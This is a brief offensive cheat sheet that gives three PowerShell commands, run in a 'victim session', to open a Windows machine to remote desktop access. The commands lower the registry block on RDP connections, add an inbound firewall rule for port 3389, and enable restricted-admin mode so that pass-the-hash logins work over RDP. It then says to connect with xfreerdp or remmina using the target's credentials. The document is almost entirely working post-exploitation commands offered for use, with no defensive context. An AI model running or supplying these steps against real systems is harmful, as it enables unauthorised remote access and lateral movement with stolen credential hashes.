# Enable RDP Access to bypass UAC

## Commands:

### Victim session

#### 1) Disable connection denial

    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

#### 2) Enable Remote Desktop Connection

    New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389

#### 3) Enable RDP Pass-the-Hash (AD)

    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

### Then connect via RDP using any RDP client like remmina or xfreerdp to target using their credentials
